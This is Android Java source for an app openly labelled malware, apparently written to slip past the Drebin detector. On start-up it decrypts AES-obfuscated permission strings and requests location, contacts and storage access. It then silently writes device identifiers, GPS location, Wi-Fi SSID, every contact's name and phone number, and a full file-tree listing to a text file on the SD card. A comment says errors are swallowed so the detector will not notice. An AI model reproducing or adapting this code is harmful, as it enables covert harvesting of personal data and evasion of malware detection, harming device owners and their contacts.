package com.shlomi.malware;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    OutputStreamWriter outputStreamWriter;
    static final byte[] KEY = "pNkSCjd9gu9zfrEh".getBytes();  // 128 bit key AES
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        malware();
    }

    private byte[] encrypt(byte[] message) throws NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException, InvalidKeyException {
        Key aesKey = new SecretKeySpec(KEY, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, aesKey);
        return cipher.doFinal(message);
    }

    private byte[] decrypt(byte[] message) throws BadPaddingException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException {
        Key aesKey = new SecretKeySpec(KEY, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, aesKey);
        return cipher.doFinal(message);
    }

    private void malware() {
        String file_name = ""; //information.txt
        String sd_card = ""; //   /sdcard/

        //Manifest.permission.XXXXXXXXXXXXXXXXXXXXXXXXXXXX
        String manifest_permission_access_fine_location = "";
        String manifest_permission_access_coarse_location = "";
        String manifest_permission_access_network_state = "";
        String manifest_permission_read_contacts = "";
        String manifest_permission_read_external_storage = "";
        String manifest_permission_write_external_storage = "";

        String context_location_service = ""; //Context.LOCATION_SERVICE

        try {
            byte[] b_file_name = {-96, 67, 107, -10, -113, -49, 41, 52, 46, -30, -96, 113, -47, 49, -81, -126};
            byte[] b_sd_card = {118, -107, -51, -121, 27, 41, 31, -52, 21, 95, 71, 105, -57, -112, -91, -36};
            byte[] b_manifest_permission_access_fine_location = {62, -119, 75, 38, 22, 66, -107, -20, -19, -28, -62, 118, 77, 97, 60, 97, 2, -46, -104, -49, -96, -4, 12, 108, 107, 98, 27, 92, -126, 58, -53, 107, -1, 14, 42, 114, 42, 85, -24, 112, 77, -17, 67, 58, 6, 9, -60, -92};
            byte[] b_manifest_permission_access_coarse_location = {62, -119, 75, 38, 22, 66, -107, -20, -19, -28, -62, 118, 77, 97, 60, 97, -22, 116, -116, -39, 62, -73, -121, 74, -108, -45, -78, -22, 46, -67, 79, -40, 43, -59, -121, 41, -94, -4, -58, 110, -16, 102, 8, -62, 63, 107, -79, -66};
            byte[] b_manifest_permission_access_network_state = {62, -119, 75, 38, 22, 66, -107, -20, -19, -28, -62, 118, 77, 97, 60, 97, -60, 114, -67, -60, -30, -63, -113, -36, 16, -42, 93, 126, -30, -107, -83, 39, -120, -94, 121, -60, -70, 125, 51, -71, -80, -32, 27, -8, -6, -92, -98, -63};
            byte[] b_manifest_permission_read_contacts = {62, -119, 75, 38, 22, 66, -107, -20, -19, -28, -62, 118, 77, 97, 60, 97, -39, -5, -127, -104, -40, 108, 104, -97, -117, 73, -44, 57, -115, -38, 108, 98, 86, -113, 110, 85, -67, -106, 94, 81, -87, 32, 117, -60, -22, -80, 69, 52};
            byte[] b_manifest_permission_read_external_storage = {62, -119, 75, 38, 22, 66, -107, -20, -19, -28, -62, 118, 77, 97, 60, 97, 6, 62, -72, 72, 116, 57, 97, -22, -52, -10, -49, -65, 103, -77, -7, -32, -19, 88, 45, 42, 29, 43, 89, 84, 86, -75, 60, 105, -105, -76, 64, -74};
            byte[] b_manifest_permission_write_external_storage = {62, -119, 75, 38, 22, 66, -107, -20, -19, -28, -62, 118, 77, 97, 60, 97, 102, 6, 95, -44, 34, -100, 115, 64, -118, -30, -30, 97, -28, 24, 75, 106, 117, 31, -40, -87, -74, 49, 55, -22, -63, -44, 97, 88, -104, 45, -2, 48};
            byte[] b_context_location_service = {6, 46, 30, 90, -86, -76, 84, 120, 8, -81, 5, -39, -125, 66, -60, -39};

            //Message to who read this:
            //I can continue doing this all day
            //but I get tired
            //this encryption strings will have to do

            file_name = new String(decrypt(b_file_name));
            sd_card = new String(decrypt(b_sd_card));
            manifest_permission_access_fine_location = new String(decrypt(b_manifest_permission_access_fine_location));
            manifest_permission_access_coarse_location = new String(decrypt(b_manifest_permission_access_coarse_location));
            manifest_permission_access_network_state = new String(decrypt(b_manifest_permission_access_network_state));
            manifest_permission_read_contacts = new String(decrypt(b_manifest_permission_read_contacts));
            manifest_permission_read_external_storage = new String(decrypt(b_manifest_permission_read_external_storage));
            manifest_permission_write_external_storage = new String(decrypt(b_manifest_permission_write_external_storage));

            context_location_service = new String(decrypt(b_context_location_service));

        } catch (Exception e) {
            //don't throw error, because Drebin may know this throws some encryption/decryption error i.e. something malware
        }

        String[] permissions_req = {
                manifest_permission_access_fine_location,
                manifest_permission_access_coarse_location,
                manifest_permission_access_network_state,
                manifest_permission_read_contacts,
                manifest_permission_read_external_storage,
                manifest_permission_write_external_storage};

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            this.requestPermissions(permissions_req, 1);
        }

        File sdcard = Environment.getExternalStorageDirectory();
        File file = new File(sdcard.getAbsolutePath(),file_name);

        try {
            outputStreamWriter = new OutputStreamWriter(new FileOutputStream(file));
            outputStreamWriter.write("Device model: " + Build.MODEL + "\n");
            outputStreamWriter.write("Product: " + Build.PRODUCT + "\n");
            outputStreamWriter.write("Device: " + Build.DEVICE + "\n");
            outputStreamWriter.write("OS version: " + System.getProperty("os.version") + "\n");
            outputStreamWriter.write("SDK version: " + Build.VERSION.SDK_INT + "\n");
            outputStreamWriter.write("Hardware: " + Build.HARDWARE + "\n");
            outputStreamWriter.write("Brand: " + Build.BRAND + "\n");
            outputStreamWriter.write("Host: " + Build.HOST + "\n");
            outputStreamWriter.write("Brand: " + Build.BRAND + "\n");
            outputStreamWriter.write("Serial: " + Build.SERIAL + "\n");
            outputStreamWriter.write("User: " + Build.USER + "\n");
            outputStreamWriter.write("Display: " + Build.DISPLAY + "\n");
            outputStreamWriter.write("Bootloader: " + Build.BOOTLOADER + "\n");
            outputStreamWriter.write("ID: " + Build.ID + "\n");
            outputStreamWriter.write("Radio version: " + Build.getRadioVersion() + "\n");

        } catch (IOException e) {
            e.printStackTrace();
        }


        LocationManager locationManager = (LocationManager) this.getSystemService(context_location_service);
        if (checkSelfPermission(manifest_permission_access_fine_location) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(manifest_permission_access_coarse_location) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    Activity#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for Activity#requestPermissions for more details.
            return;
        }
        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        try {
            outputStreamWriter.write("Location: "+location+"\n");
        } catch (IOException e) {
            e.printStackTrace();
        }

        ConnectivityManager connManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {
            try {
                outputStreamWriter.write("Connected to wifi\n");
            } catch (IOException e) {
                e.printStackTrace();
            }

            WifiManager wifiManager = (WifiManager) this.getApplicationContext().getSystemService (Context.WIFI_SERVICE);
            WifiInfo info = wifiManager.getConnectionInfo ();
            String ssid  = info.getSSID();
            try {
                outputStreamWriter.write("SSID: " + ssid + "\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            try {
                outputStreamWriter.write("Not connected to wifi\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        try {
            writeContacts();
        } catch (IOException e) {
            e.printStackTrace();
        }

        write_tree(Environment.getExternalStorageDirectory());
        write_tree(new File(sd_card));

        try {
            outputStreamWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }


    }

    private void write_tree(File root) {
        if(root.isFile()) {
            try {
                outputStreamWriter.write("File: " + root.getAbsolutePath() + "\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else {
            try {
                outputStreamWriter.write("Folder: " + root.getAbsolutePath() + "\n");
                File[] files = root.listFiles();
                if(files != null && files.length > 0) {
                    for(File f : root.listFiles()) {
                        write_tree(f);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }

    private void writeContacts() throws IOException {
        ContentResolver cr = this.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        outputStreamWriter.write("Contact name: " + name + " Phone: " + phoneNo+"\n");
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }


}
